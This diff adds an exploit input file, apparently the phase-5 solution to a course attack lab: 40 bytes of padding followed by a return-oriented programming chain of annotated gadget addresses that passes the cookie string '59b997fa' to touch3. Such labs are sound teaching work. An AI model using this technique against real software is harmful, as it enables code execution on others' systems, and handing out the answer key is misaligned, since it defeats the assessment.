@@ -1,0 +1,12 @@
+41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 /* insert A 40 times */
+06 1a 40 00 00 00 00 00 /* address of movq %rsp,%rax */
+a2 19 40 00 00 00 00 00 /* address of movq %rax,%rdi */
+ab 19 40 00 00 00 00 00 /* address of popq %rax */
+48 00 00 00 00 00 00 00 /* address shift of string */
+dd 19 40 00 00 00 00 00 /* address of movl %eax,%edx */
+69 1a 40 00 00 00 00 00 /* address of movl %edx,%ecx */
+13 1a 40 00 00 00 00 00 /* address of movl %ecx,%esi */
+d6 19 40 00 00 00 00 00 /* address of function add_xy */
+a2 19 40 00 00 00 00 00 /* address of movq %rax,%rdi */
+fa 18 40 00 00 00 00 00 /* address of touch3 */
+35 39 62 39 39 37 66 61 00 /* string of "59b997fa" */   
